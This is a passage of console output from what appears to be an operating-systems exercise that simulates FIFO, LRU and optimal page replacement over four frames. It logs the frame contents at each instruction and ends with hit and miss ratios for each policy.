17-------------------|fifo |lru |opt |-------------------|13 |17 |24 ||14 |24 |21 ||24 |14 |17 ||17 |13 |31 |-------------------cur_ins = 185cur_block = 18-------------------|fifo |lru |opt |-------------------|14 |18 |24 ||24 |17 |21 ||17 |24 |18 ||18 |14 |31 |-------------------cur_ins = 186cur_block = 18-------------------|fifo |lru |opt |-------------------|14 |18 |24 ||24 |17 |21 ||17 |24 |18 ||18 |14 |31 |-------------------cur_ins = 181cur_block = 18-------------------|fifo |lru |opt |-------------------|14 |18 |24 ||24 |17 |21 ||17 |24 |18 ||18 |14 |31 |-------------------cur_ins = 182cur_block = 18-------------------|fifo |lru |opt |-------------------|14 |18 |24 ||24 |17 |21 ||17 |24 |18 ||18 |14 |31 |-------------------cur_ins = 296cur_block = 29-------------------|fifo |lru |opt |-------------------|24 |29 |24 ||17 |18 |21 ||18 |17 |29 ||29 |24 |31 |-------------------cur_ins = 297cur_block = 29-------------------|fifo |lru |opt |-------------------|24 |29 |24 ||17 |18 |21 ||18 |17 |29 ||29 |24 |31 |-------------------cur_ins = 319cur_block = 31-------------------|fifo |lru |opt |-------------------|17 |31 |24 ||18 |29 |21 ||29 |18 |29 ||31 |17 |31 |-------------------cur_ins = 319cur_block = 31-------------------|fifo |lru |opt |-------------------|17 |31 |24 ||18 |29 |21 ||29 |18 |29 ||31 |17 |31 |-------------------cur_ins = 191cur_block = 19-------------------|fifo |lru |opt |-------------------|18 |19 |24 ||29 |31 |21 ||31 |29 |19 ||19 |18 |31 |-------------------cur_ins = 192cur_block = 19-------------------|fifo |lru |opt |-------------------|18 |19 |24 ||29 |31 |21 ||31 |29 |19 ||19 |18 |31 |-------------------cur_ins = 212cur_block = 21-------------------|fifo |lru |opt |-------------------|29 |21 |24 ||31 |19 |21 ||19 |31 |19 ||21 |29 |31 |-------------------cur_ins = 213cur_block = 21-------------------|fifo |lru |opt |-------------------|29 |21 |24 ||31 |19 |21 ||19 |31 |19 ||21 |29 |31 |-------------------cur_ins = 52cur_block = 5-------------------|fifo |lru |opt |-------------------|31 |5 |24 ||19 |21 |5 ||21 |19 |19 ||5 |31 |31 |-------------------cur_ins = 53cur_block = 5-------------------|fifo |lru |opt |-------------------|31 |5 |24 ||19 |21 |5 ||21 |19 |19 ||5 |31 |31 |-------------------cur_ins = 12cur_block = 1-------------------|fifo |lru |opt |-------------------|19 |1 |1 ||21 |5 |5 ||5 |21 |19 ||1 |19 |31 |-------------------cur_ins = 13cur_block = 1-------------------|fifo |lru |opt |-------------------|19 |1 |1 ||21 |5 |5 ||5 |21 |19 ||1 |19 |31 |-------------------cur_ins = 312cur_block = 31-------------------|fifo |lru |opt |-------------------|21 |31 |1 ||5 |1 |5 ||1 |5 |19 ||31 |21 |31 |-------------------cur_ins = 313cur_block = 31-------------------|fifo |lru |opt |-------------------|21 |31 |1 ||5 |1 |5 ||1 |5 |19 ||31 |21 |31 |-------------------cur_ins = 313cur_block = 31-------------------|fifo |lru |opt |-------------------|21 |31 |1 ||5 |1 |5 ||1 |5 |19 ||31 |21 |31 |-------------------cur_ins = 314cur_block = 31-------------------|fifo |lru |opt |-------------------|21 |31 |1 ||5 |1 |5 ||1 |5 |19 ||31 |21 |31 |-------------------cur_ins = 73cur_block = 7-------------------|fifo |lru |opt |-------------------|5 |7 |1 ||1 |31 |5 ||31 |1 |19 ||7 |5 |7 |-------------------cur_ins = 74cur_block = 7-------------------|fifo |lru |opt |-------------------|5 |7 |1 ||1 |31 |5 ||31 |1 |19 ||7 |5 |7 |-------------------cur_ins = 195cur_block = 19-------------------|fifo |lru |opt |-------------------|1 |19 |1 ||31 |7 |5 ||7 |31 |19 ||19 |1 |7 |-------------------cur_ins = 196cur_block = 19-------------------|fifo |lru |opt |-------------------|1 |19 |1 ||31 |7 |5 ||7 |31 |19 ||19 |1 |7 |-------------------cur_ins = 73cur_block = 7-------------------|fifo |lru |opt |-------------------|1 |7 |1 ||31 |19 |5 ||7 |31 |19 ||19 |1 |7 |-------------------cur_ins = 74cur_block = 7-------------------|fifo |lru |opt |-------------------|1 |7 |1 ||31 |19 |5 ||7 |31 |19 ||19 |1 |7 |-------------------cur_ins = 17cur_block = 1-------------------|fifo |lru |opt |-------------------|1 |1 |1 ||31 |7 |5 ||7 |19 |19 ||19 |31 |7 |-------------------cur_ins = 18cur_block = 1-------------------|fifo |lru |opt |-------------------|1 |1 |1 ||31 |7 |5 ||7 |19 |19 ||19 |31 |7 |-------------------cur_ins = 27cur_block = 2-------------------|fifo |lru |opt |-------------------|31 |2 |1 ||7 |1 |5 ||19 |7 |19 ||2 |19 |2 |-------------------cur_ins = 28cur_block = 2-------------------|fifo |lru |opt |-------------------|31 |2 |1 ||7 |1 |5 ||19 |7 |19 ||2 |19 |2 |-------------------cur_ins = 237cur_block = 23-------------------|fifo |lru |opt |-------------------|7 |23 |1 ||19 |2 |5 ||2 |1 |23 ||23 |7 |2 |-------------------cur_ins = 238cur_block = 23-------------------|fifo |lru |opt |-------------------|7 |23 |1 ||19 |2 |5 ||2 |1 |23 ||23 |7 |2 |-------------------cur_ins = 89cur_block = 8-------------------|fifo |lru |opt |-------------------|19 |8 |1 ||2 |23 |5 ||23 |2 |8 ||8 |1 |2 |-------------------cur_ins = 90cur_block = 9-------------------|fifo |lru |opt |-------------------|2 |9 |1 ||23 |8 |5 ||8 |23 |9 ||9 |2 |2 |-------------------cur_ins = 277cur_block = 27-------------------|fifo |lru |opt |-------------------|23 |27 |1 ||8 |9 |5 ||9 |8 |27 ||27 |23 |2 |-------------------cur_ins = 278cur_block = 27-------------------|fifo |lru |opt |-------------------|23 |27 |1 ||8 |9 |5 ||9 |8 |27 ||27 |23 |2 |-------------------cur_ins = 130cur_block = 13-------------------|fifo |lru |opt |-------------------|8 |13 |1 ||9 |27 |5 ||27 |9 |27 ||13 |8 |13 |-------------------cur_ins = 131cur_block = 13-------------------|fifo |lru |opt |-------------------|8 |13 |1 ||9 |27 |5 ||27 |9 |27 ||13 |8 |13 |-------------------cur_ins = 11cur_block = 1-------------------|fifo |lru |opt |-------------------|9 |1 |1 ||27 |13 |5 ||13 |27 |27 ||1 |9 |13 |-------------------cur_ins = 12cur_block = 1-------------------|fifo |lru |opt |-------------------|9 |1 |1 ||27 |13 |5 ||13 |27 |27 ||1 |9 |13 |-------------------cur_ins = 57cur_block = 5-------------------|fifo |lru |opt |-------------------|27 |5 |1 ||13 |1 |5 ||1 |13 |27 ||5 |27 |13 |-------------------cur_ins = 58cur_block = 5-------------------|fifo |lru |opt |-------------------|27 |5 |1 ||13 |1 |5 ||1 |13 |27 ||5 |27 |13 |-------------------cur_ins = 267cur_block = 26-------------------|fifo |lru |opt |-------------------|13 |26 |1 ||1 |5 |5 ||5 |1 |27 ||26 |13 |26 |-------------------cur_ins = 268cur_block = 26-------------------|fifo |lru |opt |-------------------|13 |26 |1 ||1 |5 |5 ||5 |1 |27 ||26 |13 |26 |-------------------cur_ins = 242cur_block = 24-------------------|fifo |lru |opt |-------------------|1 |24 |24 ||5 |26 |5 ||26 |5 |27 ||24 |1 |26 |-------------------cur_ins = 243cur_block = 24-------------------|fifo |lru |opt |-------------------|1 |24 |24 ||5 |26 |5 ||26 |5 |27 ||24 |1 |26 |-------------------cur_ins = 276cur_block = 27-------------------|fifo |lru |opt |-------------------|5 |27 |24 ||26 |24 |5 ||24 |26 |27 ||27 |5 |26 |-------------------cur_ins = 277cur_block = 27-------------------|fifo |lru |opt |-------------------|5 |27 |24 ||26 |24 |5 ||24 |26 |27 ||27 |5 |26 |-------------------cur_ins = 43cur_block = 4-------------------|fifo |lru |opt |-------------------|26 |4 |24 ||24 |27 |5 ||27 |24 |4 ||4 |26 |26 |-------------------cur_ins = 44cur_block = 4-------------------|fifo |lru |opt |-------------------|26 |4 |24 ||24 |27 |5 ||27 |24 |4 ||4 |26 |26 |-------------------cur_ins = 31cur_block = 3-------------------|fifo |lru |opt |-------------------|24 |3 |3 ||27 |4 |5 ||4 |27 |4 ||3 |24 |26 |-------------------cur_ins = 32cur_block = 3-------------------|fifo |lru |opt |-------------------|24 |3 |3 ||27 |4 |5 ||4 |27 |4 ||3 |24 |26 |-------------------cur_ins = 140cur_block = 14-------------------|fifo |lru |opt |-------------------|27 |14 |3 ||4 |3 |14 ||3 |4 |4 ||14 |27 |26 |-------------------cur_ins = 141cur_block = 14-------------------|fifo |lru |opt |-------------------|27 |14 |3 ||4 |3 |14 ||3 |4 |4 ||14 |27 |26 |-------------------cur_ins = 315cur_block = 31-------------------|fifo |lru |opt |-------------------|4 |31 |3 ||3 |14 |14 ||14 |3 |31 ||31 |4 |26 |-------------------cur_ins = 316cur_block = 31-------------------|fifo |lru |opt |-------------------|4 |31 |3 ||3 |14 |14 ||14 |3 |31 ||31 |4 |26 |-------------------cur_ins = 187cur_block = 18-------------------|fifo |lru |opt |-------------------|3 |18 |3 ||14 |31 |14 ||31 |14 |18 ||18 |3 |26 |-------------------cur_ins = 188cur_block = 18-------------------|fifo |lru |opt |-------------------|3 |18 |3 ||14 |31 |14 ||31 |14 |18 ||18 |3 |26 |-------------------cur_ins = 221cur_block = 22-------------------|fifo |lru |opt |-------------------|14 |22 |3 ||31 |18 |14 ||18 |31 |22 ||22 |14 |26 |-------------------cur_ins = 222cur_block = 22-------------------|fifo |lru |opt |-------------------|14 |22 |3 ||31 |18 |14 ||18 |31 |22 ||22 |14 |26 |-------------------cur_ins = 301cur_block = 30-------------------|fifo |lru |opt |-------------------|31 |30 |3 ||18 |22 |30 ||22 |18 |22 ||30 |31 |26 |-------------------cur_ins = 302cur_block = 30-------------------|fifo |lru |opt |-------------------|31 |30 |3 ||18 |22 |30 ||22 |18 |22 ||30 |31 |26 |-------------------cur_ins = 28cur_block = 2-------------------|fifo |lru |opt |-------------------|18 |2 |3 ||22 |30 |2 ||30 |22 |22 ||2 |18 |26 |-------------------cur_ins = 29cur_block = 2-------------------|fifo |lru |opt |-------------------|18 |2 |3 ||22 |30 |2 ||30 |22 |22 ||2 |18 |26 |-------------------cur_ins = 198cur_block = 19-------------------|fifo |lru |opt |-------------------|22 |19 |3 ||30 |2 |19 ||2 |30 |22 ||19 |22 |26 |-------------------cur_ins = 199cur_block = 19-------------------|fifo |lru |opt |-------------------|22 |19 |3 ||30 |2 |19 ||2 |30 |22 ||19 |22 |26 |-------------------cur_ins = 128cur_block = 12-------------------|fifo |lru |opt |-------------------|30 |12 |3 ||2 |19 |12 ||19 |2 |22 ||12 |30 |26 |-------------------cur_ins = 129cur_block = 12-------------------|fifo |lru |opt |-------------------|30 |12 |3 ||2 |19 |12 ||19 |2 |22 ||12 |30 |26 |-------------------cur_ins = 117cur_block = 11-------------------|fifo |lru |opt |-------------------|2 |11 |3 ||19 |12 |11 ||12 |19 |22 ||11 |2 |26 |-------------------cur_ins = 118cur_block = 11-------------------|fifo |lru |opt |-------------------|2 |11 |3 ||19 |12 |11 ||12 |19 |22 ||11 |2 |26 |-------------------cur_ins = 262cur_block = 26-------------------|fifo |lru |opt |-------------------|19 |26 |3 ||12 |11 |11 ||11 |12 |22 ||26 |19 |26 |-------------------cur_ins = 263cur_block = 26-------------------|fifo |lru |opt |-------------------|19 |26 |3 ||12 |11 |11 ||11 |12 |22 ||26 |19 |26 |-------------------cur_ins = 223cur_block = 22-------------------|fifo |lru |opt |-------------------|12 |22 |3 ||11 |26 |11 ||26 |11 |22 ||22 |12 |26 |-------------------cur_ins = 224cur_block = 22-------------------|fifo |lru |opt |-------------------|12 |22 |3 ||11 |26 |11 ||26 |11 |22 ||22 |12 |26 |-------------------cur_ins = 35cur_block = 3-------------------|fifo |lru |opt |-------------------|11 |3 |3 ||26 |22 |11 ||22 |26 |22 ||3 |11 |26 |-------------------cur_ins = 36cur_block = 3-------------------|fifo |lru |opt |-------------------|11 |3 |3 ||26 |22 |11 ||22 |26 |22 ||3 |11 |26 |-------------------cur_ins = 140cur_block = 14-------------------|fifo |lru |opt |-------------------|26 |14 |3 ||22 |3 |11 ||3 |22 |14 ||14 |26 |26 |-------------------cur_ins = 141cur_block = 14-------------------|fifo |lru |opt |-------------------|26 |14 |3 ||22 |3 |11 ||3 |22 |14 ||14 |26 |26 |-------------------cur_ins = 210cur_block = 21-------------------|fifo |lru |opt |-------------------|22 |21 |21 ||3 |14 |11 ||14 |3 |14 ||21 |22 |26 |-------------------cur_ins = 211cur_block = 21-------------------|fifo |lru |opt |-------------------|22 |21 |21 ||3 |14 |11 ||14 |3 |14 ||21 |22 |26 |-------------------cur_ins = 40cur_block = 4-------------------|fifo |lru |opt |-------------------|3 |4 |21 ||14 |21 |11 ||21 |14 |14 ||4 |3 |4 |-------------------cur_ins = 41cur_block = 4-------------------|fifo |lru |opt |-------------------|3 |4 |21 ||14 |21 |11 ||21 |14 |14 ||4 |3 |4 |-------------------cur_ins = 128cur_block = 12-------------------|fifo |lru |opt |-------------------|14 |12 |12 ||21 |4 |11 ||4 |21 |14 ||12 |14 |4 |-------------------cur_ins = 129cur_block = 12-------------------|fifo |lru |opt |-------------------|14 |12 |12 ||21 |4 |11 ||4 |21 |14 ||12 |14 |4 |-------------------cur_ins = 86cur_block = 8-------------------|fifo |lru |opt |-------------------|21 |8 |8 ||4 |12 |11 ||12 |4 |14 ||8 |21 |4 |-------------------cur_ins = 87cur_block = 8-------------------|fifo |lru |opt |-------------------|21 |8 |8 ||4 |12 |11 ||12 |4 |14 ||8 |21 |4 |-------------------cur_ins = 40cur_block = 4-------------------|fifo |lru |opt |-------------------|21 |4 |8 ||4 |8 |11 ||12 |12 |14 ||8 |21 |4 |-------------------cur_ins = 41cur_block = 4-------------------|fifo |lru |opt |-------------------|21 |4 |8 ||4 |8 |11 ||12 |12 |14 ||8 |21 |4 |-------------------cur_ins = 101cur_block = 10-------------------|fifo |lru |opt |-------------------|4 |10 |10 ||12 |4 |11 ||8 |8 |14 ||10 |12 |4 |-------------------cur_ins = 102cur_block = 10-------------------|fifo |lru |opt |-------------------|4 |10 |10 ||12 |4 |11 ||8 |8 |14 ||10 |12 |4 |-------------------cur_ins = 109cur_block = 10-------------------|fifo |lru |opt |-------------------|4 |10 |10 ||12 |4 |11 ||8 |8 |14 ||10 |12 |4 |-------------------cur_ins = 110cur_block = 11-------------------|fifo |lru |opt |-------------------|12 |11 |10 ||8 |10 |11 ||10 |4 |14 ||11 |8 |4 |-------------------cur_ins = 51cur_block = 5-------------------|fifo |lru |opt |-------------------|8 |5 |5 ||10 |11 |11 ||11 |10 |14 ||5 |4 |4 |-------------------cur_ins = 52cur_block = 5-------------------|fifo |lru |opt |-------------------|8 |5 |5 ||10 |11 |11 ||11 |10 |14 ||5 |4 |4 |-------------------cur_ins = 146cur_block = 14-------------------|fifo |lru |opt |-------------------|10 |14 |5 ||11 |5 |11 ||5 |11 |14 ||14 |10 |4 |-------------------cur_ins = 147cur_block = 14-------------------|fifo |lru |opt |-------------------|10 |14 |5 ||11 |5 |11 ||5 |11 |14 ||14 |10 |4 |-------------------cur_ins = 42cur_block = 4-------------------|fifo |lru |opt |-------------------|11 |4 |5 ||5 |14 |11 ||14 |5 |14 ||4 |11 |4 |-------------------cur_ins = 43cur_block = 4-------------------|fifo |lru |opt |-------------------|11 |4 |5 ||5 |14 |11 ||14 |5 |14 ||4 |11 |4 |-------------------cur_ins = 14cur_block = 1-------------------|fifo |lru |opt |-------------------|5 |1 |5 ||14 |4 |11 ||4 |14 |1 ||1 |5 |4 |-------------------cur_ins = 15cur_block = 1-------------------|fifo |lru |opt |-------------------|5 |1 |5 ||14 |4 |11 ||4 |14 |1 ||1 |5 |4 |-------------------cur_ins = 216cur_block = 21-------------------|fifo |lru |opt |-------------------|14 |21 |5 ||4 |1 |11 ||1 |4 |21 ||21 |14 |4 |-------------------cur_ins = 217cur_block = 21-------------------|fifo |lru |opt |-------------------|14 |21 |5 ||4 |1 |11 ||1 |4 |21 ||21 |14 |4 |-------------------cur_ins = 177cur_block = 17-------------------|fifo |lru |opt |-------------------|4 |17 |5 ||1 |21 |11 ||21 |1 |17 ||17 |4 |4 |-------------------cur_ins = 178cur_block = 17-------------------|fifo |lru |opt |-------------------|4 |17 |5 ||1 |21 |11 ||21 |1 |17 ||17 |4 |4 |-------------------cur_ins = 49cur_block = 4-------------------|fifo |lru |opt |-------------------|4 |4 |5 ||1 |17 |11 ||21 |21 |17 ||17 |1 |4 |-------------------cur_ins = 50cur_block = 5-------------------|fifo |lru |opt |-------------------|1 |5 |5 ||21 |4 |11 ||17 |17 |17 ||5 |21 |4 |-------------------cur_ins = 110cur_block = 11-------------------|fifo |lru |opt |-------------------|21 |11 |5 ||17 |5 |11 ||5 |4 |17 ||11 |17 |4 |-------------------cur_ins = 111cur_block = 11-------------------|fifo |lru |opt |-------------------|21 |11 |5 ||17 |5 |11 ||5 |4 |17 ||11 |17 |4 |-------------------cur_ins = 300cur_block = 30-------------------|fifo |lru |opt |-------------------|17 |30 |5 ||5 |11 |11 ||11 |5 |30 ||30 |4 |4 |-------------------cur_ins = 301cur_block = 30-------------------|fifo |lru |opt |-------------------|17 |30 |5 ||5 |11 |11 ||11 |5 |30 ||30 |4 |4 |-------------------cur_ins = 49cur_block = 4-------------------|fifo |lru |opt |-------------------|5 |4 |5 ||11 |30 |11 ||30 |11 |30 ||4 |5 |4 |-------------------cur_ins = 50cur_block = 5-------------------|fifo |lru |opt |-------------------|5 |5 |5 ||11 |4 |11 ||30 |30 |30 ||4 |11 |4 |-------------------cur_ins = 263cur_block = 26-------------------|fifo |lru |opt |-------------------|11 |26 |26 ||30 |5 |11 ||4 |4 |30 ||26 |30 |4 |-------------------cur_ins = 264cur_block = 26-------------------|fifo |lru |opt |-------------------|11 |26 |26 ||30 |5 |11 ||4 |4 |30 ||26 |30 |4 |-------------------cur_ins = 21cur_block = 2-------------------|fifo |lru |opt |-------------------|30 |2 |26 ||4 |26 |11 ||26 |5 |2 ||2 |4 |4 |-------------------cur_ins = 22cur_block = 2-------------------|fifo |lru |opt |-------------------|30 |2 |26 ||4 |26 |11 ||26 |5 |2 ||2 |4 |4 |-------------------cur_ins = 9cur_block = 0-------------------|fifo |lru |opt |-------------------|4 |0 |26 ||26 |2 |11 ||2 |26 |0 ||0 |5 |4 |-------------------cur_ins = 10cur_block = 1-------------------|fifo |lru |opt |-------------------|26 |1 |26 ||2 |0 |11 ||0 |2 |0 ||1 |26 |1 |-------------------cur_ins = 194cur_block = 19-------------------|fifo |lru |opt |-------------------|2 |19 |26 ||0 |1 |11 ||1 |0 |0 ||19 |2 |19 |-------------------cur_ins = 195cur_block = 19-------------------|fifo |lru |opt |-------------------|2 |19 |26 ||0 |1 |11 ||1 |0 |0 ||19 |2 |19 |-------------------cur_ins = 192cur_block = 19-------------------|fifo |lru |opt |-------------------|2 |19 |26 ||0 |1 |11 ||1 |0 |0 ||19 |2 |19 |-------------------cur_ins = 193cur_block = 19-------------------|fifo |lru |opt |-------------------|2 |19 |26 ||0 |1 |11 ||1 |0 |0 ||19 |2 |19 |-------------------cur_ins = 159cur_block = 15-------------------|fifo |lru |opt |-------------------|0 |15 |26 ||1 |19 |11 ||19 |1 |0 ||15 |0 |15 |-------------------cur_ins = 160cur_block = 16-------------------|fifo |lru |opt |-------------------|1 |16 |26 ||19 |15 |11 ||15 |19 |0 ||16 |1 |16 |-------------------cur_ins = 244cur_block = 24-------------------|fifo |lru |opt |-------------------|19 |24 |26 ||15 |16 |11 ||16 |15 |0 ||24 |19 |24 |-------------------cur_ins = 245cur_block = 24-------------------|fifo |lru |opt |-------------------|19 |24 |26 ||15 |16 |11 ||16 |15 |0 ||24 |19 |24 |-------------------cur_ins = 128cur_block = 12-------------------|fifo |lru |opt |-------------------|15 |12 |26 ||16 |24 |11 ||24 |16 |0 ||12 |15 |12 |-------------------cur_ins = 129cur_block = 12-------------------|fifo |lru |opt |-------------------|15 |12 |26 ||16 |24 |11 ||24 |16 |0 ||12 |15 |12 |-------------------cur_ins = 35cur_block = 3-------------------|fifo |lru |opt |-------------------|16 |3 |26 ||24 |12 |11 ||12 |24 |0 ||3 |16 |3 |-------------------cur_ins = 36cur_block = 3-------------------|fifo |lru |opt |-------------------|16 |3 |26 ||24 |12 |11 ||12 |24 |0 ||3 |16 |3 |-------------------cur_ins = 114cur_block = 11-------------------|fifo |lru |opt |-------------------|24 |11 |26 ||12 |3 |11 ||3 |12 |0 ||11 |24 |3 |-------------------cur_ins = 115cur_block = 11-------------------|fifo |lru |opt |-------------------|24 |11 |26 ||12 |3 |11 ||3 |12 |0 ||11 |24 |3 |-------------------cur_ins = 237cur_block = 23-------------------|fifo |lru |opt |-------------------|12 |23 |26 ||3 |11 |11 ||11 |3 |0 ||23 |12 |23 |-------------------cur_ins = 238cur_block = 23-------------------|fifo |lru |opt |-------------------|12 |23 |26 ||3 |11 |11 ||11 |3 |0 ||23 |12 |23 |-------------------cur_ins = 74cur_block = 7-------------------|fifo |lru |opt |-------------------|3 |7 |26 ||11 |23 |11 ||23 |11 |0 ||7 |3 |7 |-------------------cur_ins = 75cur_block = 7-------------------|fifo |lru |opt |-------------------|3 |7 |26 ||11 |23 |11 ||23 |11 |0 ||7 |3 |7 |-------------------cur_ins = 264cur_block = 26-------------------|fifo |lru |opt |-------------------|11 |26 |26 ||23 |7 |11 ||7 |23 |0 ||26 |11 |7 |-------------------cur_ins = 265cur_block = 26-------------------|fifo |lru |opt |-------------------|11 |26 |26 ||23 |7 |11 ||7 |23 |0 ||26 |11 |7 |-------------------cur_ins = 2cur_block = 0-------------------|fifo |lru |opt |-------------------|23 |0 |26 ||7 |26 |11 ||26 |7 |0 ||0 |23 |7 |-------------------cur_ins = 3cur_block = 0-------------------|fifo |lru |opt |-------------------|23 |0 |26 ||7 |26 |11 ||26 |7 |0 ||0 |23 |7 |-------------------cur_ins = 0cur_block = 0-------------------|fifo |lru |opt |-------------------|23 |0 |26 ||7 |26 |11 ||26 |7 |0 ||0 |23 |7 |-------------------cur_ins = 1cur_block = 0-------------------|fifo |lru |opt |-------------------|23 |0 |26 ||7 |26 |11 ||26 |7 |0 ||0 |23 |7 |-------------------cur_ins = 194cur_block = 19-------------------|fifo |lru |opt |-------------------|7 |19 |19 ||26 |0 |11 ||0 |26 |0 ||19 |7 |7 |-------------------cur_ins = 195cur_block = 19-------------------|fifo |lru |opt |-------------------|7 |19 |19 ||26 |0 |11 ||0 |26 |0 ||19 |7 |7 |-------------------cur_ins = 257cur_block = 25-------------------|fifo |lru |opt |-------------------|26 |25 |19 ||0 |19 |11 ||19 |0 |0 ||25 |26 |25 |-------------------cur_ins = 258cur_block = 25-------------------|fifo |lru |opt |-------------------|26 |25 |19 ||0 |19 |11 ||19 |0 |0 ||25 |26 |25 |-------------------cur_ins = 10cur_block = 1-------------------|fifo |lru |opt |-------------------|0 |1 |1 ||19 |25 |11 ||25 |19 |0 ||1 |0 |25 |-------------------cur_ins = 11cur_block = 1-------------------|fifo |lru |opt |-------------------|0 |1 |1 ||19 |25 |11 ||25 |19 |0 ||1 |0 |25 |-------------------cur_ins = 64cur_block = 6-------------------|fifo |lru |opt |-------------------|19 |6 |6 ||25 |1 |11 ||1 |25 |0 ||6 |19 |25 |-------------------cur_ins = 65cur_block = 6-------------------|fifo |lru |opt |-------------------|19 |6 |6 ||25 |1 |11 ||1 |25 |0 ||6 |19 |25 |-------------------cur_ins = 84cur_block = 8-------------------|fifo |lru |opt |-------------------|25 |8 |8 ||1 |6 |11 ||6 |1 |0 ||8 |25 |25 |-------------------cur_ins = 85cur_block = 8-------------------|fifo |lru |opt |-------------------|25 |8 |8 ||1 |6 |11 ||6 |1 |0 ||8 |25 |25 |-------------------cur_ins = 48cur_block = 4-------------------|fifo |lru |opt |-------------------|1 |4 |8 ||6 |8 |11 ||8 |6 |0 ||4 |1 |4 |-------------------cur_ins = 49cur_block = 4-------------------|fifo |lru |opt |-------------------|1 |4 |8 ||6 |8 |11 ||8 |6 |0 ||4 |1 |4 |-------------------cur_ins = 318cur_block = 31-------------------|fifo |lru |opt |-------------------|6 |31 |8 ||8 |4 |11 ||4 |8 |0 ||31 |6 |31 |-------------------cur_ins = 319cur_block = 31-------------------|fifo |lru |opt |-------------------|6 |31 |8 ||8 |4 |11 ||4 |8 |0 ||31 |6 |31 |-------------------cur_ins = 98cur_block = 9-------------------|fifo |lru |opt |-------------------|8 |9 |8 ||4 |31 |11 ||31 |4 |0 ||9 |8 |9 |-------------------cur_ins = 99cur_block = 9-------------------|fifo |lru |opt |-------------------|8 |9 |8 ||4 |31 |11 ||31 |4 |0 ||9 |8 |9 |-------------------cur_ins = 1cur_block = 0-------------------|fifo |lru |opt |-------------------|4 |0 |8 ||31 |9 |11 ||9 |31 |0 ||0 |4 |9 |-------------------cur_ins = 2cur_block = 0-------------------|fifo |lru |opt |-------------------|4 |0 |8 ||31 |9 |11 ||9 |31 |0 ||0 |4 |9 |-------------------cur_ins = 215cur_block = 21-------------------|fifo |lru |opt |-------------------|31 |21 |8 ||9 |0 |11 ||0 |9 |21 ||21 |31 |9 |-------------------cur_ins = 216cur_block = 21-------------------|fifo |lru |opt |-------------------|31 |21 |8 ||9 |0 |11 ||0 |9 |21 ||21 |31 |9 |-------------------cur_ins = 144cur_block = 14-------------------|fifo |lru |opt |-------------------|9 |14 |8 ||0 |21 |11 ||21 |0 |14 ||14 |9 |9 |-------------------cur_ins = 145cur_block = 14-------------------|fifo |lru |opt |-------------------|9 |14 |8 ||0 |21 |11 ||21 |0 |14 ||14 |9 |9 |-------------------cur_ins = 119cur_block = 11-------------------|fifo |lru |opt |-------------------|0 |11 |8 ||21 |14 |11 ||14 |21 |14 ||11 |0 |9 |-------------------cur_ins = 120cur_block = 12-------------------|fifo |lru |opt |-------------------|21 |12 |8 ||14 |11 |12 ||11 |14 |14 ||12 |21 |9 |-------------------cur_ins = 137cur_block = 13-------------------|fifo |lru |opt |-------------------|14 |13 |8 ||11 |12 |13 ||12 |11 |14 ||13 |14 |9 |-------------------cur_ins = 138cur_block = 13-------------------|fifo |lru |opt |-------------------|14 |13 |8 ||11 |12 |13 ||12 |11 |14 ||13 |14 |9 |-------------------cur_ins = 188cur_block = 18-------------------|fifo |lru |opt |-------------------|11 |18 |8 ||12 |13 |18 ||13 |12 |14 ||18 |11 |9 |-------------------cur_ins = 189cur_block = 18-------------------|fifo |lru |opt |-------------------|11 |18 |8 ||12 |13 |18 ||13 |12 |14 ||18 |11 |9 |-------------------cur_ins = 143cur_block = 14-------------------|fifo |lru |opt |-------------------|12 |14 |8 ||13 |18 |18 ||18 |13 |14 ||14 |12 |9 |-------------------cur_ins = 144cur_block = 14-------------------|fifo |lru |opt |-------------------|12 |14 |8 ||13 |18 |18 ||18 |13 |14 ||14 |12 |9 |-------------------cur_ins = 237cur_block = 23-------------------|fifo |lru |opt |-------------------|13 |23 |8 ||18 |14 |23 ||14 |18 |14 ||23 |13 |9 |-------------------cur_ins = 238cur_block = 23-------------------|fifo |lru |opt |-------------------|13 |23 |8 ||18 |14 |23 ||14 |18 |14 ||23 |13 |9 |-------------------cur_ins = 243cur_block = 24-------------------|fifo |lru |opt |-------------------|18 |24 |8 ||14 |23 |24 ||23 |14 |14 ||24 |18 |9 |-------------------cur_ins = 244cur_block = 24-------------------|fifo |lru |opt |-------------------|18 |24 |8 ||14 |23 |24 ||23 |14 |14 ||24 |18 |9 |-------------------cur_ins = 84cur_block = 8-------------------|fifo |lru |opt |-------------------|14 |8 |8 ||23 |24 |24 ||24 |23 |14 ||8 |14 |9 |-------------------cur_ins = 85cur_block = 8-------------------|fifo |lru |opt |-------------------|14 |8 |8 ||23 |24 |24 ||24 |23 |14 ||8 |14 |9 |-------------------cur_ins = 251cur_block = 25-------------------|fifo |lru |opt |-------------------|23 |25 |25 ||24 |8 |24 ||8 |24 |14 ||25 |23 |9 |-------------------cur_ins = 252cur_block = 25-------------------|fifo |lru |opt |-------------------|23 |25 |25 ||24 |8 |24 ||8 |24 |14 ||25 |23 |9 |-------------------cur_ins = 195cur_block = 19-------------------|fifo |lru |opt |-------------------|24 |19 |19 ||8 |25 |24 ||25 |8 |14 ||19 |24 |9 |-------------------cur_ins = 196cur_block = 19-------------------|fifo |lru |opt |-------------------|24 |19 |19 ||8 |25 |24 ||25 |8 |14 ||19 |24 |9 |-------------------cur_ins = 172cur_block = 17-------------------|fifo |lru |opt |-------------------|8 |17 |17 ||25 |19 |24 ||19 |25 |14 ||17 |8 |9 |-------------------cur_ins = 173cur_block = 17-------------------|fifo |lru |opt |-------------------|8 |17 |17 ||25 |19 |24 ||19 |25 |14 ||17 |8 |9 |-------------------cur_ins = 311cur_block = 31-------------------|fifo |lru |opt |-------------------|25 |31 |31 ||19 |17 |24 ||17 |19 |14 ||31 |25 |9 |-------------------cur_ins = 312cur_block = 31-------------------|fifo |lru |opt |-------------------|25 |31 |31 ||19 |17 |24 ||17 |19 |14 ||31 |25 |9 |-------------------cur_ins = 24cur_block = 2-------------------|fifo |lru |opt |-------------------|19 |2 |2 ||17 |31 |24 ||31 |17 |14 ||2 |19 |9 |-------------------cur_ins = 25cur_block = 2-------------------|fifo |lru |opt |-------------------|19 |2 |2 ||17 |31 |24 ||31 |17 |14 ||2 |19 |9 |--------------------------------------------------------------------|item |fifo |lru |opt |-------------------------------------------------|hit |167 |169 |204 ||hit_ratio |52.1875 |52.8125 |63.75 ||miss |153 |151 |116 ||miss_ratio |47.8125 |47.1875 |36.25 